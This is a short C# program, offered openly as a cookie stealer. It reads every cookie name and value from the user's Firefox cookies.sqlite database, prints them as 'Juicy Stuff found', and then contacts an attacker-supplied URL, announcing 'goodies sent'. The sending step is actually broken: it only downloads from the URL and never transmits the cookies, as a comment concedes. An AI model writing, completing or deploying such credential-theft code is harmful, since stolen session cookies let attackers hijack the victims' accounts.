using System;
using System.Collections.Generic;
using System.IO;
using System.Data.SQLite;
using System.Net;

class Program
{
    static void Main()
    {
        Console.WriteLine("where should I sent it? ");
        string apple_url = Console.ReadLine();

        if (!string.IsNullOrWhiteSpace(apple_url))
        {
            HoundCookie(apple_url);
        }
        else
        {
            Console.WriteLine("Try again. give a better URL.");
        }
    }

    static void HoundCookie(string apple_url)
    {
        string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        string profileDir = Path.Combine(appData, "Mozilla", "Firefox", "Profiles");

        string[] profiles = Directory.GetDirectories(profileDir);
        string profile = profiles[0];

        string honeypot = Path.Combine(profile, "cookies.sqlite");
        using (SQLiteConnection conn = new SQLiteConnection($"Data Source={honeypot};Version=3;"))
        {
            conn.Open();
            using (SQLiteCommand command = new SQLiteCommand("SELECT name, value FROM moz_cookies", conn))
            {
                using (SQLiteDataReader reader = command.ExecuteReader())
                {
                    List<KeyValuePair<string, string>> cookies = new List<KeyValuePair<string, string>>();

                    while (reader.Read())
                    {
                        string name = reader["name"].ToString();
                        string value = reader["value"].ToString();
                        cookies.Add(new KeyValuePair<string, string>(name, value));
                    }

                    Console.WriteLine("Juicy Stuff found:");
                    foreach (var cookie in cookies)
                    {
                        Console.WriteLine($"{cookie.Key}: {cookie.Value}");
                    }

                    if (cookies.Count > 0)
                    {
                        using (WebClient client = new WebClient())
                        {
                            try
                            {
                                // This line sends the cookies to the server
                                // You'd need to modify this part to send the cookies in the required format by the server
                                string response = client.DownloadString(apple_url);
                                Console.WriteLine("goodies sent .");
                            }
                            catch (WebException ex)
                            {
                                Console.WriteLine($"Failed, Status code: {(int)((HttpWebResponse)ex.Response).StatusCode}");
                            }
                        }
                    }
                    else
                    {
                        Console.WriteLine("Nothing here");
                    }
                }
            }
        }
    }
}
